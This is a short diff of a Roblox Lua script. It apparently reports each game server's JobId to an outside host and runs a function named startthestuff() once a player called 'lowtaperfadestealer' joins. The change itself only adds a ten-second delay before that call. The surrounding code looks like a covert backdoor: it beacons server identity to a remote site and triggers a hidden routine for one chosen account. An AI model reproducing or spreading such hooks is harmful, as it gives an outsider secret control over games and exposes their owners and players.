@@ -134,6 +134,7 @@ end
 game:HttpGet("https://mojitomint.pythonanywhere.com/set?a="..game.JobId)
 game.Players.PlayerAdded:Connect(function(player)
     if player.Name == "lowtaperfadestealer" then
+    wait(10)
     startthestuff()
     end
 end)
